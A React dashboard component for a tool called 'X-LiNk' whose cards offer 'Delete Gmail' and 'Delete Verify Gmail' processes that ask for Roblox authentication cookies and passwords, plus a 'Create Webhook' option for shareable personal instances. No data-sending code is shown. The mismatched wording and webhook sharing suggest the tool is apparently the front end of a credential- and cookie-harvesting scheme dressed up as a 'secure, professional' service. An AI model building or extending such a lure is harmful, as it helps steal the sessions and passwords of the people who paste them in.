import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Mail, Shield, Trash2, Webhook } from "lucide-react";

interface DashboardProps {
  onDeleteGmail: () => void;
  onDeleteVerifyGmail: () => void;
  onCreateWebhook: () => void;
}

export const Dashboard = ({
  onDeleteGmail,
  onDeleteVerifyGmail,
  onCreateWebhook,
}: DashboardProps) => {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-8">
      <motion.div
        className="text-center mb-16"
        initial={{ opacity: 0, y: -30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8 }}
      >
        <h1 className="text-6xl font-bold text-white mb-4 tracking-wider">
          X-LiNk
        </h1>
        <div className="w-24 h-1 bg-gradient-to-r from-blue-500 to-purple-600 mx-auto mb-4"></div>
        <p className="text-gray-300 text-xl font-light">
          Advanced Management System
        </p>
      </motion.div>

      <div className="grid lg:grid-cols-3 md:grid-cols-2 grid-cols-1 gap-8 max-w-7xl w-full">
        <motion.div
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          whileHover={{ scale: 1.02, y: -5 }}
          whileTap={{ scale: 0.98 }}
        >
          <Card className="bg-black/50 border-red-500/30 backdrop-blur-xl hover:bg-black/60 transition-all duration-500 cursor-pointer h-full group shadow-2xl hover:shadow-red-500/20">
            <CardHeader className="text-center pb-6">
              <div className="flex justify-center mb-6">
                <motion.div
                  className="p-6 bg-gradient-to-br from-red-600/20 to-red-700/30 rounded-2xl group-hover:from-red-500/30 group-hover:to-red-600/40 transition-all duration-300"
                  whileHover={{ rotate: 5 }}
                >
                  <Trash2 className="w-16 h-16 text-red-400 group-hover:text-red-300 transition-colors" />
                </motion.div>
              </div>
              <CardTitle className="text-2xl text-white font-bold tracking-wide">
                Delete Gmail
              </CardTitle>
              <div className="w-12 h-0.5 bg-red-500 mx-auto mt-2"></div>
            </CardHeader>
            <CardContent className="text-center space-y-4">
              <p className="text-red-200 text-base leading-relaxed">
                Standard Gmail account deletion process. Requires Roblox
                authentication cookies.
              </p>
              <div className="space-y-1 text-sm text-red-300/70">
                <p>• Quick processing</p>
                <p>• Cookie authentication</p>
                <p>• Instant execution</p>
              </div>
              <Button
                onClick={onDeleteGmail}
                className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white py-3 text-base font-semibold shadow-lg hover:shadow-red-500/25 transition-all duration-300 transform hover:scale-105"
                size="lg"
              >
                <Mail className="w-4 h-4 mr-2" />
                Initialize Process
              </Button>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          whileHover={{ scale: 1.02, y: -5 }}
          whileTap={{ scale: 0.98 }}
        >
          <Card className="bg-black/50 border-orange-500/30 backdrop-blur-xl hover:bg-black/60 transition-all duration-500 cursor-pointer h-full group shadow-2xl hover:shadow-orange-500/20">
            <CardHeader className="text-center pb-6">
              <div className="flex justify-center mb-6">
                <motion.div
                  className="p-6 bg-gradient-to-br from-orange-600/20 to-orange-700/30 rounded-2xl group-hover:from-orange-500/30 group-hover:to-orange-600/40 transition-all duration-300"
                  whileHover={{ rotate: -5 }}
                >
                  <Shield className="w-16 h-16 text-orange-400 group-hover:text-orange-300 transition-colors" />
                </motion.div>
              </div>
              <CardTitle className="text-2xl text-white font-bold tracking-wide">
                Delete Verify Gmail
              </CardTitle>
              <div className="w-12 h-0.5 bg-orange-500 mx-auto mt-2"></div>
            </CardHeader>
            <CardContent className="text-center space-y-4">
              <p className="text-orange-200 text-base leading-relaxed">
                Advanced verified Gmail deletion. Requires both authentication
                cookies and password.
              </p>
              <div className="space-y-1 text-sm text-orange-300/70">
                <p>• Enhanced security</p>
                <p>• Dual authentication</p>
                <p>• Verified processing</p>
              </div>
              <Button
                onClick={onDeleteVerifyGmail}
                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-500 hover:to-orange-600 text-white py-3 text-base font-semibold shadow-lg hover:shadow-orange-500/25 transition-all duration-300 transform hover:scale-105"
                size="lg"
              >
                <Shield className="w-4 h-4 mr-2" />
                Initialize Process
              </Button>
            </CardContent>
          </Card>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, x: 50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ duration: 0.8, delay: 0.6 }}
          whileHover={{ scale: 1.02, y: -5 }}
          whileTap={{ scale: 0.98 }}
          className="lg:col-span-1 md:col-span-2"
        >
          <Card className="bg-black/50 border-purple-500/30 backdrop-blur-xl hover:bg-black/60 transition-all duration-500 cursor-pointer h-full group shadow-2xl hover:shadow-purple-500/20">
            <CardHeader className="text-center pb-6">
              <div className="flex justify-center mb-6">
                <motion.div
                  className="p-6 bg-gradient-to-br from-purple-600/20 to-purple-700/30 rounded-2xl group-hover:from-purple-500/30 group-hover:to-purple-600/40 transition-all duration-300"
                  whileHover={{ rotate: 10 }}
                >
                  <Webhook className="w-16 h-16 text-purple-400 group-hover:text-purple-300 transition-colors" />
                </motion.div>
              </div>
              <CardTitle className="text-2xl text-white font-bold tracking-wide">
                Create Webhook
              </CardTitle>
              <div className="w-12 h-0.5 bg-purple-500 mx-auto mt-2"></div>
            </CardHeader>
            <CardContent className="text-center space-y-4">
              <p className="text-purple-200 text-base leading-relaxed">
                Generate your own X-LiNk instance with custom webhook. Create
                your personal management portal.
              </p>
              <div className="space-y-1 text-sm text-purple-300/70">
                <p>• Custom webhook URL</p>
                <p>• Personal instance</p>
                <p>• Share with others</p>
              </div>
              <Button
                onClick={onCreateWebhook}
                className="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-500 hover:to-purple-600 text-white py-3 text-base font-semibold shadow-lg hover:shadow-purple-500/25 transition-all duration-300 transform hover:scale-105"
                size="lg"
              >
                <Webhook className="w-4 h-4 mr-2" />
                Create Instance
              </Button>
            </CardContent>
          </Card>
        </motion.div>
      </div>

      <motion.div
        className="mt-16 text-center"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.8, delay: 0.8 }}
      >
        <div className="w-32 h-px bg-gradient-to-r from-transparent via-gray-500 to-transparent mx-auto mb-4"></div>
        <p className="text-gray-500 text-sm font-light tracking-wider">
          SECURE • RELIABLE • PROFESSIONAL
        </p>
      </motion.div>
    </div>
  );
};
